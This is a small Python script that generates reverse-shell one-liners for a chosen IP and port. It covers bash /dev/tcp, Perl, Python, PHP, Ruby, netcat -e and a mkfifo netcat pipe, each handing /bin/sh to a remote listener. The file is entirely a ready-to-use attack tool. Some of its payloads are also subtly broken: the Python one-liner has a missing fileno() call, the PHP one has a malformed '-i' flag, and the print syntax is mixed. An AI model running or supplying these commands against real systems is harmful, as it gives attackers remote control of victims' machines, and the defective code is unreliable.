#!/usr/bin/python

import sys

if len(sys.argv) != 3:
    print("Usage: ./shell-gen.py IP PORT")
else:
    ip = str(sys.argv[1])
    port = sys.argv[2]
    print ("Generating reverse shells for IP: " + ip + " on port " + port+"\n\n")

    bash = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1"
    perlLong = """perl -e 'use Socket;$i=\"""" + ip + """";$p="""+port+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
    python = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno,2);p=subprocess.call(["/bin/sh","-i"]);'"""
    php = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");exec("/bin/sh <i <&3 >&3 2>&3");'"""
    ruby = """ruby -rsocket -e'f=TCPSocket.open(\""""+ip+"""","""+port+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f,f,f)'"""
    nc = """nc -e /bin/sh """+ip+""" """+port
    nc2 = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
    xterm = """xterm -display """+ip+""":"""+port

    print bash + "\n"
    print perlLong + "\n"
    print python + "\n"
    print php + "\n"
    print ruby + "\n"
    print nc + "\n"
    print nc2 + "\n"
